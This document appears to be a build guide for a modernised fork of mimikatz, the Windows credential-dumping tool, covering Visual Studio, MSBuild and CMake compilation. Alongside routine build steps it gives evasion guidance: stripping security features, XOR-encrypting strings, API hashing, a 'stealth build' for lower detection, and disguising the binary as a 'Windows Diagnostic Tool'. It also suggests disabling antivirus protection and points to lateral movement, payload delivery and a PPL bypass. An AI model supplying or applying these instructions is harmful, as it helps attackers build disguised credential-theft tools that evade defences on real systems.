# Mimikatz Build Guide - Windows 11 25H2 Edition

## Overview

Comprehensive build guide for compiling mimikatz with Windows 11 25H2 support, including modern compiler configurations, optimization settings, and obfuscation options.

## Prerequisites

### Required Software

**1. Visual Studio 2022** (Community, Professional, or Enterprise)
- Workloads:
  - Desktop development with C++
  - Windows 10/11 SDK (22621 or later)
- Individual components:
  - MSVC v143 - VS 2022 C++ x64/x86 build tools
  - Windows 11 SDK (10.0.22621.0 or later)
  - C++ ATL for latest v143 build tools
  - C++ MFC for latest v143 build tools

**2. Windows Driver Kit (WDK)** (Optional, for driver compilation)
- Version: 10.0.22621.0 or later
- Required only for `mimidrv` kernel driver
- Download: https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk

**3. Git**
- For version control and cloning repository
- Download: https://git-scm.com/downloads

**4. Python 3.10+** (Optional, for build automation)
- Required for automated testing and build scripts
- Download: https://www.python.org/downloads/

### Optional Software

**CMake 3.20+**: Alternative build system
**LLVM/Clang**: For additional optimization passes
**Resource Hacker**: For modifying PE resources
**UPX**: For executable packing (not recommended for evasion)

## Quick Start

### 1. Clone Repository

```cmd
git clone https://github.com/volume19/mimikatz-modern.git
cd mimikatz-modern
```

### 2. Open Solution

```cmd
cd mimikatz
start mimikatz.sln
```

### 3. Select Configuration

In Visual Studio:
- Configuration: `Release`
- Platform: `x64` (recommended) or `Win32` or `ARM64`

### 4. Build

```
Build → Build Solution (Ctrl+Shift+B)
```

### 5. Output

Binaries will be in:
```
x64\Release\mimikatz.exe
x64\Release\mimilib.dll
x64\Release\mimidrv.sys  (if WDK installed)
```

## Detailed Build Instructions

### Method 1: Visual Studio IDE

**Step-by-Step**:

1. **Open Visual Studio 2022**

2. **Open Solution**: `File → Open → Project/Solution`
   - Navigate to `mimikatz\mimikatz.sln`
   - Click Open

3. **Review Solution Structure**:
   - `mimikatz` - Main executable project
   - `mimilib` - DLL library project
   - `mimidrv` - Kernel driver project (optional)
   - `mimilove` - Additional components
   - `mimispool` - Print spooler module

4. **Set Active Project**: Right-click `mimikatz` → Set as Startup Project

5. **Configuration Manager**:
   - `Build → Configuration Manager`
   - Active solution configuration: `Release`
   - Active solution platform: `x64`
   - Check projects to build:
     - [x] mimikatz
     - [x] mimilib
     - [ ] mimidrv (requires WDK)

6. **Project Properties** (Right-click mimikatz → Properties):

   **C/C++ → General**:
   - SDL checks: No
   - Warning Level: Level3 (/W3)
   - Treat Warnings As Errors: No

   **C/C++ → Optimization** (Release):
   - Optimization: Maximize Speed (/O2)
   - Inline Function Expansion: Any Suitable (/Ob2)
   - Enable Intrinsic Functions: Yes
   - Favor Size Or Speed: Favor fast code (/Ot)
   - Whole Program Optimization: Yes

   **C/C++ → Code Generation**:
   - Runtime Library: Multi-threaded (/MT) for static linking
   - Security Check: Disabled (/GS-) for smaller size
   - Control Flow Guard: No (for compatibility)

   **Linker → General**:
   - Enable Incremental Linking: No
   - Link Time Code Generation: Use Link Time Code Generation

   **Linker → Debugging**:
   - Generate Debug Info: No (for release)
   - Generate Map File: No

   **Linker → Advanced**:
   - Target Machine: MachineX64 (/MACHINE:X64)
   - Randomized Base Address: No (/DYNAMICBASE:NO) - optional for analysis
   - Data Execution Prevention: No (/NXCOMPAT:NO) - optional

7. **Build**: `Build → Build Solution` or press `Ctrl+Shift+B`

8. **Check Output**:
   - Output window shows build progress
   - Look for "Build succeeded" message
   - Binary location: `x64\Release\mimikatz.exe`

### Method 2: MSBuild Command Line

**Open Developer Command Prompt for VS 2022**:

```cmd
"C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\VsDevCmd.bat"
```

**Standard Build**:
```cmd
cd C:\Users\Will\mimikatz
msbuild mimikatz.sln /p:Configuration=Release /p:Platform=x64 /m
```

**Parameters**:
- `/p:Configuration=Release` - Release build (optimized)
- `/p:Platform=x64` - 64-bit target
- `/m` - Multi-processor build (faster)
- `/v:detailed` - Verbose output (for debugging)

**Clean Build**:
```cmd
msbuild mimikatz.sln /t:Clean /p:Configuration=Release /p:Platform=x64
msbuild mimikatz.sln /t:Rebuild /p:Configuration=Release /p:Platform=x64 /m
```

**Build Specific Project**:
```cmd
msbuild mimikatz\mimikatz.vcxproj /p:Configuration=Release /p:Platform=x64
```

### Method 3: CMake Build (Alternative)

**Create CMakeLists.txt** (if not exists):

```cmake
cmake_minimum_required(VERSION 3.20)
project(mimikatz C)

set(CMAKE_C_STANDARD 11)

# Main executable
add_executable(mimikatz
    mimikatz/mimikatz.c
    # Add all source files
)

target_include_directories(mimikatz PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}/inc
    ${CMAKE_CURRENT_SOURCE_DIR}/modules
)

target_link_libraries(mimikatz
    advapi32
    ntdll
    crypt32
    winscard
    # Add required libraries
)

# Compiler flags
if(MSVC)
    target_compile_options(mimikatz PRIVATE
        /MT  # Static runtime
        /O2  # Optimize for speed
        /GS- # Disable security checks
    )
endif()
```

**Build with CMake**:
```cmd
mkdir build
cd build
cmake .. -G "Visual Studio 17 2022" -A x64
cmake --build . --config Release
```

## Build Configurations

### Release (Recommended for Production)

```
Configuration: Release
Platform: x64
Optimizations: Maximum (/O2)
Runtime: Static (/MT)
Debug Info: No
Size: ~2-3 MB
```

**Use Cases**:
- Production deployments
- Red team operations
- Security assessments

### Debug (Development Only)

```
Configuration: Debug
Platform: x64
Optimizations: Disabled (/Od)
Runtime: Debug (/MTd)
Debug Info: Full (/Zi)
Size: ~8-10 MB
```

**Use Cases**:
- Development
- Debugging issues
- Adding new features

### MinSizeRel (Smallest Binary)

```
Configuration: Release
Platform: x64
Optimizations: Minimize Size (/O1 /Os)
Runtime: Static (/MT)
Linker: /OPT:REF /OPT:ICF
Size: ~1-1.5 MB
```

**Use Cases**:
- Constrained environments
- Lateral movement
- Payload delivery

## Platform Targets

### x64 (64-bit) - Recommended

```cmd
msbuild mimikatz.sln /p:Configuration=Release /p:Platform=x64
```

**Advantages**:
- Full feature support
- Better performance
- Native on modern Windows

**Output**: `x64\Release\mimikatz.exe`

### x86 (32-bit) - Legacy Support

```cmd
msbuild mimikatz.sln /p:Configuration=Release /p:Platform=Win32
```

**Advantages**:
- Compatible with 32-bit processes
- Smaller binary size
- Legacy system support

**Limitations**:
- Cannot access 64-bit LSASS directly
- Some features disabled

**Output**: `Win32\Release\mimikatz.exe`

### ARM64 - Windows on ARM

```cmd
msbuild mimikatz.sln /p:Configuration=Release /p:Platform=ARM64
```

**Advantages**:
- Native on Windows on ARM devices
- Surface Pro X, Qualcomm Snapdragon

**Limitations**:
- Limited testing
- Some features may not work

**Output**: `ARM64\Release\mimikatz.exe`

## Advanced Build Options

### Static Linking (No DLL Dependencies)

Edit project properties:
- `C/C++ → Code Generation → Runtime Library: /MT`
- Linker will include all dependencies in executable

**Advantages**:
- Single file deployment
- No missing DLL issues
- Better for payload delivery

### Code Obfuscation

**Manual Obfuscation Steps**:

1. **String Encryption**: Encrypt sensitive strings
   ```c
   // Before
   printf("mimikatz");

   // After
   char enc[] = {0x6D^0xAA, 0x69^0xAA, 0x6D^0xAA, 0x69^0xAA,
                 0x6B^0xAA, 0x61^0xAA, 0x74^0xAA, 0x7A^0xAA, 0};
   for(int i=0; enc[i]; i++) enc[i] ^= 0xAA;
   printf("%s", enc);
   ```

2. **Function Name Mangling**: Use cryptic function names

3. **Control Flow Flattening**: Use state machines instead of direct calls

4. **API Hashing**: Replace direct imports with hash-based resolution

5. **Junk Code Insertion**: Add meaningless instructions

**Automated Obfuscation Tools**:
- LLVM-Obfuscator
- Tigress
- VMProtect (commercial)

### Position Independent Code (PIC)

For shellcode/reflective loading:

```c
// Add to compiler flags
/DYNAMICBASE:NO  // Disable ASLR
/FIXED           // Fixed base address
/BASE:0x400000   // Specific load address
```

### Resource Modification

**Change Icon**:
```cmd
ResourceHacker.exe -open mimikatz.exe -save mimikatz_new.exe -action addskip -res icon.ico -mask ICONGROUP,MAINICON,
```

**Change Version Info**:
Edit `mimikatz.rc` before building:
```rc
FILEVERSION 1,0,0,0
PRODUCTVERSION 1,0,0,0
VALUE "FileDescription", "Windows Diagnostic Tool"
VALUE "ProductName", "System Utilities"
```

## Troubleshooting

### Error: MSB3073 (Driver Build Failed)

**Problem**: WDK not installed or not configured

**Solution**:
- Install WDK 10.0.22621.0 or later
- OR disable driver project in Configuration Manager
- OR modify `mimikatz.sln` to skip `mimidrv`

### Error: Cannot open include file 'windows.h'

**Problem**: Windows SDK not installed

**Solution**:
- Install Windows 11 SDK (10.0.22621.0+) via Visual Studio Installer
- Verify SDK path in project properties

### Error: LNK1181: cannot open input file 'ntdll.lib'

**Problem**: Missing Windows SDK libraries

**Solution**:
- Reinstall Windows SDK
- Check library directories in project properties
- Verify Platform Toolset is correct (v143)

### Error: C2220: warning treated as error

**Problem**: Compiler warnings treated as errors

**Solution**:
- `Project Properties → C/C++ → General → Treat Warnings As Errors: No`
- OR fix the specific warnings

### Large Binary Size (>10MB)

**Causes**:
- Debug configuration
- Debug symbols included
- Dynamic runtime linking

**Solutions**:
- Use Release configuration
- Disable debug info
- Use static runtime (/MT)
- Enable link-time optimization

### Antivirus Blocking Compilation

**Problem**: AV deletes mimikatz.exe during build

**Solution**:
- Add exclusion for build directory
- Disable real-time protection temporarily
- Use obfuscation techniques

## Post-Build Steps

### 1. Strip Debug Symbols

```cmd
strip --strip-all mimikatz.exe
```

### 2. Pack Executable (Optional)

**UPX Packing**:
```cmd
upx --best --ultra-brute mimikatz.exe -o mimikatz_packed.exe
```

**Warning**: Packing may increase detection rate

### 3. Sign Executable (Optional)

```cmd
signtool sign /f certificate.pfx /p password /t http://timestamp.digicert.com mimikatz.exe
```

### 4. Verify Binary

```cmd
# Check architecture
dumpbin /headers mimikatz.exe | findstr "machine"

# Check imports
dumpbin /imports mimikatz.exe

# Check size
dir mimikatz.exe
```

## Automated Build Script

**build.ps1**:
```powershell
# Load VS environment
& "C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\Launch-VsDevShell.ps1"

# Clean
msbuild mimikatz.sln /t:Clean /p:Configuration=Release /p:Platform=x64

# Build
msbuild mimikatz.sln /t:Rebuild /p:Configuration=Release /p:Platform=x64 /m /v:minimal

# Check result
if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] Build succeeded" -ForegroundColor Green
    dir x64\Release\mimikatz.exe
} else {
    Write-Host "[-] Build failed with error $LASTEXITCODE" -ForegroundColor Red
    exit $LASTEXITCODE
}
```

**Usage**:
```powershell
powershell -ExecutionPolicy Bypass -File build.ps1
```

## Continuous Integration

### GitHub Actions Workflow

**.github/workflows/build.yml**:
```yaml
name: Build Mimikatz

on:
  push:
    branches: [ master, develop ]
  pull_request:
    branches: [ master ]

jobs:
  build:
    runs-on: windows-latest

    steps:
    - uses: actions/checkout@v3

    - name: Setup MSBuild
      uses: microsoft/setup-msbuild@v1.1

    - name: Build x64
      run: msbuild mimikatz.sln /p:Configuration=Release /p:Platform=x64 /m

    - name: Upload artifacts
      uses: actions/upload-artifact@v3
      with:
        name: mimikatz-x64
        path: x64/Release/mimikatz.exe
```

## Build Variants

### Variant 1: Minimal Build (Sekurlsa Only)

Comment out unused modules in `mimikatz.c`:
```c
// Disable modules
// {&kuhl_m_crypto, ...},
// {&kuhl_m_dpapi, ...},
// Only keep sekurlsa
```

Result: Smaller binary (~1MB)

### Variant 2: Driver-Enabled Build

Enable driver communication:
```c
#define MIMIKATZ_DRIVER_ENABLED
#include "driver_interface.h"
```

Result: PPL bypass support

### Variant 3: Stealth Build

- Remove all console output
- Encrypt strings
- Use direct syscalls
- No named artifacts

Result: Lower detection rate

## Build Verification

### Checksums

```cmd
certutil -hashfile mimikatz.exe SHA256
```

### Entropy Analysis

```python
import math
from collections import Counter

def calculate_entropy(data):
    if not data:
        return 0
    entropy = 0
    counter = Counter(data)
    for count in counter.values():
        p = count / len(data)
        entropy -= p * math.log2(p)
    return entropy

with open('mimikatz.exe', 'rb') as f:
    data = f.read()
    entropy = calculate_entropy(data)
    print(f"Entropy: {entropy:.2f} bits per byte")

# Packed: ~7.5-8.0
# Unpacked: ~6.0-7.0
# Normal: ~5.0-6.0
```

### Import Analysis

```cmd
# List all imported DLLs and functions
dumpbin /imports mimikatz.exe > imports.txt
```

## Next Steps

After successful build:
1. Test on clean Windows 11 25H2 VM
2. Verify all modules function correctly
3. Test PPL bypass with driver
4. Validate credential extraction
5. Document any issues or improvements

## Support

For build issues:
- Check GitHub Issues
- Review build logs in `build_log.txt`
- Enable verbose MSBuild output: `/v:detailed`
- Contact: willburns89@gmail.com

---

**Last Updated**: 2025-10-22
**Tested With**: Visual Studio 2022 (17.8.0), Windows SDK 22621
**Author**: Will Burns (Volume19)
